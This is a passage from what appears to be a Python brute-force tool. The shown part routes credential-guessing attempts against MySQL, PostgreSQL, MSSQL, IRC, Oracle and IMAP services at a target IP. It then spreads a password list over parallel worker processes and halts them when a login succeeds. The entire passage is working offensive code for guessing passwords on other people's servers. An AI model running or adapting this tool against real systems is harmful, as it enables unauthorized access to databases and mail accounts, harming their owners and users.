        target_func = lambda u, p, child_id, attempt_num, total: mysql_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 3306, debug=False)
    elif proto == "postgres":
        target_func = lambda u, p, child_id, attempt_num, total: postgres_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 5432, debug=False)
    elif proto == "mssql":
        target_func = lambda u, p, child_id, attempt_num, total: mssql_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 1433, debug=False)
    elif proto == "irc":
        target_func = lambda u, p, child_id, attempt_num, total: irc_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 6667, debug=False)
    elif proto == "oracle":
        target_func = lambda u, p, child_id, attempt_num, total: oracle_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 1521, debug=False)
    elif proto == "imap":
        target_func = lambda u, p, child_id, attempt_num, total: imap_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or (993 if args.ssl else 143), use_ssl=args.ssl, debug=False)
    else:
        error_message(f"Protocol {proto} not implemented.")
        sys.exit(1)

    # ------- Multiprocessing for speed -------
    num_procs = max(1, args.threads // 4)
    manager = multiprocessing.Manager()
    result_flag = manager.Event()
    chunk_size = len(passwords) // num_procs
    password_chunks = [passwords[i*chunk_size:(i+1)*chunk_size] for i in range(num_procs)]
    if len(password_chunks) < num_procs:
        password_chunks += [[] for _ in range(num_procs - len(password_chunks))]
    if password_chunks and sum(len(x) for x in password_chunks) < len(passwords):
        password_chunks[-1].extend(passwords[sum(len(x) for x in password_chunks):])
    procs = []
    try:
        for i in range(num_procs):
            p = multiprocessing.Process(
                target=multi_worker,
                args=(target_func, usernames, password_chunks[i], False, result_flag, proto, target_ip, i)
            )
            procs.append(p)
            p.start()
        password_found = False
        while True:
            if result_flag.is_set():
                for p in procs:
                    if p.is_alive():
                        p.terminate()
                password_found = True
                break
            if all(not p.is_alive() for p in procs):
                break
            time.sleep(0.1)
    except KeyboardInterrupt:
        for p in procs:
            if p.is_alive():
                p.terminate()
        print(colored("\n[INFO] Interrupted by user. Exiting cleanly.", "yellow", ["bold"]))
        sys.exit(0)
    except Exception as e:
        error_message(f"Unexpected error: {e}")
        for p in procs:
            if p.is_alive():
                p.terminate()
        sys.exit(1)
    for p in procs:
        p.join()
    format_status(target_ip, password_found, proto, False)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n[INFO] Interrupted by user. Exiting cleanly.", "yellow", ["bold"]))
        sys.exit(0)
    except Exception as e:
        error_message(f"Fatal error: {e}")
        sys.exit(1)
